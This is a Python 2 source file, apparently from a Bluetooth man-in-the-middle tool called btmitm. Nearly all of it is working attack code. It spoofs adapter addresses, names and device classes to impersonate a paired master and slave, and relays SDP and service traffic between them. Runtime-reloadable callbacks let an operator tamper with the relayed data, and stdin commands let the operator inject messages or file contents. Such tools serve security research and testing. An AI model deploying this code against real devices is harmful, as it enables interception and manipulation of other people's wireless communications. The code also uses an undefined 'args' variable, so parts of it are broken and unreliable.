import bluetooth, sys, time, select, os
from threading import Thread
from bluetooth import *
from btmitm_utils import *
from btmitm_adapter import *
from bluez_simple_agent import Paired


# increments the last octet of a mac addr and returns it as string
def inc_last_octet(addr):
    return addr[:15] + hex((int(addr.split(':')[5], 16) + 1) & 0xff).replace('0x','').upper()

def mitm_sdp(slave,):
    server=bluetooth.BluetoothSocket( bluetooth.L2CAP )
    server.bind(('',1))
    server.listen(10)
    sock=bluetooth.BluetoothSocket(bluetooth.L2CAP)
    sock.connect((slave, 1))
    print 'SDP interceptor started'
    client_sock,address = server.accept()
    print("SDP Inq from  ",address)
    fds = [client_sock,sock,server]
    while True:
        inputready, outputready, exceptready = select.select(fds,[],[])
        for s in inputready:
            if s == client_sock:
                try:
                    data = client_sock.recv(100000)
                    if not data: 
                        raise RuntimeError('client dc\'d')
                    try: sock.send(data)
                    except Exception as e:
                        print 'client failed ',e
                except Exception as e:
                    fds = [sock,server]
                    client_sock.close()

            if s == sock:
                print 'slave sdp recv'
                try:
                    data = sock.recv(100000)
                    try:
                        client_sock.send(data)
                    except Exception as e:
                        print 'inquirer disconnected', e
                        client_sock.close()
                        fds = [sock,server]
                except Exception as e:
                    while True:
                        sock=bluetooth.BluetoothSocket(bluetooth.L2CAP)
                        try:
                            sock.connect((slave, 1))
                            fds = [client_sock] if len(fds) > 2 else []
                            fds += [sock,server]

                            break
                        except Exception as e: print 'slave connect failed ',e
            if s == server:
                client_sock,address = server.accept()
                fds = [sock,server,client_sock]
                print("SDP Inq from  ",address)



class Btmitm():
    def __init__(self,**kwargs):
        self.addrport = ''
        self.slave_adapter=''
        self.master_adapter=''
        self.shared_adapter=''
        self.shared = False
        self.slave_info = {}
        self.master_info = {}
        self._options = [
                ('target_slave',None),
                ('target_master',None),
                ('already_paired',False),
                ('slave_name','btmitm_slave'),
                ('master_name','btmitm_master'),
                ('master_adapter',None),
                ('slave_adapter',None),
                ]
        for i in self._options:
            setattr(self,i[0],i[1])
        self.option(**kwargs)

    def option(self,**kwargs):
        for i in self._options:
            if i[0] in kwargs:
                setattr(self,i[0],kwargs[i[0]])

    def pair(self,adapter,remote_addr,**kwargs):
        tries = kwargs.get('tries',15)
        while True:
            try:
                pair_adapter(adapter, remote_addr)
                break
            except Exception as e:
                tries = tries -1
                if tries <= 0:
                    break
                print e
                print 'Trying again ..'
                time.sleep(1)


    def start_service(self, service, adapter_addr=''):
        server_sock=None
        #print 'creating server emulating  ', service

        if service['protocol'].lower() == 'l2cap':
            server_sock=BluetoothSocket( L2CAP )
        else:
            server_sock=BluetoothSocket( RFCOMM )

        #print 'Binding to ', adapter_addr, service['protocol'] ,service['port']
        #server_sock.bind((adapt_addr,service['port']))
        server_sock.bind(('',service['port']))
        #print 'binded'
        server_sock.listen(1)
        #print 'listening'

        port = server_sock.getsockname()[1]

        return server_sock

    def do_mitm(self, server_sock, slave_sock, service):
        print slave_sock
        master_sock, client_info = server_sock.accept()
        print master_sock,slave_sock
        print("Accepted connection from ", client_info)
        fds = [master_sock, slave_sock, sys.stdin]
        reshandler, reqhandler = self.refreshHandlers()
        lastreq = ''
        lastres = ''
        def relay(sender, recv, cb):
            data = sender.recv(1000)
            data = cb(data)
            recv.send(data)

        while True:
            print 'Selecting...'
            inputready, outputready, exceptready = select.select(fds,[],[])
            print 'Selected!'
            for s in inputready:

                # master
                if s == master_sock:
                    try:
                        relay(master_sock, slave_sock, reqhandler)
                    except Exception as e:
                        print e, 'socket master reconnecting...'
                        master_sock, client_info = server_sock.accept()
                        print("Accepted connection from ", client_info)
                        fds = [master_sock, slave_sock, sys.stdin]
                        break

                # slave
                if s == slave_sock:
                    try:
                        relay(slave_sock, master_sock, reshandler)
                    except Exception as e:
                        print e, 'socket slave reconnecting...'
                        slave_sock = self.connect_to_svc(service, reconnect=True)
                        fds = [master_sock, slave_sock, sys.stdin]
                        break

                # user commands
                try:
                    if s == sys.stdin:
                        cmd = raw_input()

                        if cmd: print '<< '+ cmd +' >>'
                        cmd = cmd.lower()
                        if cmd[:1] == 'r' or cmd[:7] == 'refresh':
                            print '<< Refreshed >>'
                            reshandler, reqhandler = self.refreshHandlers()
                        elif cmd[:1] == 'a':
                            print '<< Resending last request >>'
                            slave_sock.send( reshandler( lastreq ))
                        elif cmd[:2] == 'sm':
                            print 'Enter msg to send to slave:'
                            a = raw_input()
                            print '>>', a
                            slave_sock.send(a)

                        elif cmd[:2] == 'mm':
                            print 'Enter msg to send to master:'
                            a = raw_input()
                            print '<<', a
                            master_sock.send(a)
                        elif cmd[:2] == 'sf':
                            print 'sending file contents to slave...'
                            contents = open(cmd.split(' ')[1],'r').read()
                            print '>>', contents
                            slave_sock.send(contents)


                        elif cmd[:2] == 'mf':
                            print 'sending file contents to master...'
                            contents = open(cmd.split(' ')[1],'r').read()
                            print '<<', contents
                            master_sock.send(contents)

                except Exception as e:
                    print e

        server_sock.close() 
        master_sock.close() 
        slave_sock.close() 

    
    def set_adapter_order(self,):
        """ Set the slave adapter to be the lower hciX """
        if int(self.slave_adapter[3:]) > int(self.master_adapter[3:]):
            # swap
            tmp = self.slave_adapter
            self.slave_adapter = self.master_adapter
            self.master_adapter = tmp

    def setup_adapters(self,):
        if os.getuid() != 0:
            print "Must run as root. (sudo)"
            import sys
            sys.exit(1)

        instrument_bluetoothd()
        adapters = list_adapters()

        if 1:
            master_adapter = ''
            slave_adapter = ''
            if len(adapters) < 2:
                if len(adapters) > 0:
                    print 'Using shared adapter'
                    slave_adapter = adapters[0]
                    master_adapter = adapters[0]
                    self.shared = True
                else:
                    raise RuntimeError('Needs to be atleast one bluetooth adapter')
            else:
                slave_adapter = adapters[0]
                master_adapter = adapters[1]
            self.option(master_adapter = master_adapter)
            self.option(slave_adapter = slave_adapter)
        self.set_adapter_order()

        if not self.already_paired:
            enable_adapter(self.slave_adapter,True)
            enable_adapter(self.master_adapter,True)
            reset_adapter(self.slave_adapter)
            reset_adapter(self.master_adapter)

            # set addresses before setup
            #adapter_address(slave_adapter, self.target_master)
            adapter_address(self.slave_adapter, inc_last_octet(self.target_master))
            adapter_address(self.master_adapter, inc_last_octet(self.target_slave))

            reset_adapter(self.slave_adapter)
            reset_adapter(self.master_adapter)

            print 'Slave adapter: ', self.slave_adapter
            print 'Master adapter: ', self.master_adapter

            print 'Looking up info on slave ('+self.target_slave+')'
            self.slave_info = lookup_info(self.target_slave)
            print 'Looking up info on master ('+self.target_master+')'
            self.master_info = lookup_info(self.target_master)
            if args.slave_name:
                self.option(slave_name = args.slave_name)
            else:
                self.option(slave_name = self.slave_info['name']+'_btmitm')

            if args.master_name:
                self.option(master_name = args.master_name)
            else:
                self.option(master_name = self.master_info['name']+'_btmitm')
            if self.shared:
                self.option(master_name = self.slave_name)


            # clone the slave adapter as the master device
            print 'Spoofing master name as ', self.slave_name
            adapter_name(self.master_adapter, self.slave_name)

            # have the spoofed slave connect directly to master
            """
            if args.slave_active:
                print 'Pairing (spoofed slave & master)...'
                enable_adapter(master_adapter, True)
                adapter_name(master_adapter, mn)
                adapter_class(master_adapter, slave_info['class'])
                enable_adapter_ssp(master_adapter,True)
                advertise_adapter(master_adapter, True)
                while True:
                    try:
                        pair_adapter(master_adapter, target_master)
                        break
                    except Exception as e:
                        print e
                        print 'Trying again ...'
                        time.sleep(1)
            """
     
            enable_adapter_ssp(self.slave_adapter,True)
            print 'Pairing (spoofed master & slave)...'
            print 'Spoofing slave name as ', self.master_name
            adapter_name(self.slave_adapter, self.master_name)

    def mitm(self,):
        self.setup_adapters()
        
        enable_adapter(self.master_adapter,False)
        if not self.already_paired:
            self.pair(self.slave_adapter,self.target_slave)
      
        #TODO
        socks = self.safe_connect(self.target_slave)

        enable_adapter(self.master_adapter, True)
        enable_adapter_ssp(self.master_adapter,True)
        advertise_adapter(self.master_adapter, True)

        # open connections
        threads = []
        sdpthread = Thread(target =mitm_sdp, args = (self.target_slave,))
        sdpthread.daemon = True
        sdpthread.start()

        print "Hello, world", socks
        if not self.already_paired:
            if not self.shared: 
                adapter_class(self.master_adapter, self.slave_info['class'])
                adapter_class(self.slave_adapter, self.master_info['class'])
            else:
                adapter_class(self.slave_adapter, self.slave_info['class'])



        for (slave_sock,service) in socks:
            print 'Beginning MiTM on ', service['name']
            server_sock = self.start_service(service)
            #slave_sock = self.connect_to_svc(service)
            thread = Thread(target = self.do_mitm, args = (server_sock, slave_sock, service,))
            thread.daemon = True
            threads.append(thread)

        for thr in threads:
            thr.start()

        if not self.already_paired:
            if not self.shared: 
                adapter_class(self.master_adapter, self.slave_info['class'])
                adapter_class(self.slave_adapter, self.master_info['class'])
            else:
                adapter_class(self.slave_adapter, self.slave_info['class'])

        import signal, sys
        def signal_handler(signal, frame):
            sys.exit(0)
        signal.signal(signal.SIGINT, signal_handler)
        signal.pause()

        print 'Now connect to '+self.master_name+' from the master device'

        for i in threads:
            i.join()
        sdpthread.join()


                            

    def refreshHandlers(self):
        """
            reloads the manipulation code during runtime
        """
        try:
            import btmitm_replace
            reload(btmitm_replace)
        except Exception as e: 
            print e
        from btmitm_replace import btmitm_slave_cb, btmitm_master_cb
        return btmitm_slave_cb, btmitm_master_cb

    def connect_to_svc(self,device, **kwargs):
        socktype = bluetooth.RFCOMM
        if device['protocol'] == None or device['protocol'].lower() == 'rfcomm':
            socktype = bluetooth.RFCOMM

        elif device['protocol'].lower() == 'l2cap':
            socktype = bluetooth.L2CAP
        else:
            print('Unsupported protocol '+device['protocol'])

        while True:
            try:
                print 'Connecting to ', device
                sock=bluetooth.BluetoothSocket( socktype )
                #if kwargs.get('restart_adapter'):
                if 0:
                    enable_adapter(self.master_adapter,False)
                    sock.connect((device['host'], device['port'] if device['port'] else 1))
                    enable_adapter(self.master_adapter,True)
                else:
                    sock.connect((device['host'], device['port'] if device['port'] else 1))

                print 'Connected'
                return sock
            except BluetoothError as e:
                if '115' in e[0]:  # connection in progress
                    print 'Connection in progress...'
                    return sock
                print 'Couldnt connect: ',e, e[0][0]
                if not kwargs.get('reconnect',False):
                    raise RuntimeError("connect_to_svc")
                print 'Reconnecting...'


    def safe_connect(self,target):
        """
            Connect to all services on target as a client.
        """

        services = bluetooth.find_service(address=target)
        
        if len(services) <= 0:
            print 'Running inquiry scan'
            services = inquire(target)

        socks = []
        for svc in services:
            try:
                socks.append( (self.connect_to_svc(svc),svc) )
            except Exception as e:
                print 'Couldn\'t connect: ',e

        if len(services) > 0:
            return socks
        else:
            raise RuntimeError('Could not lookup '+target)



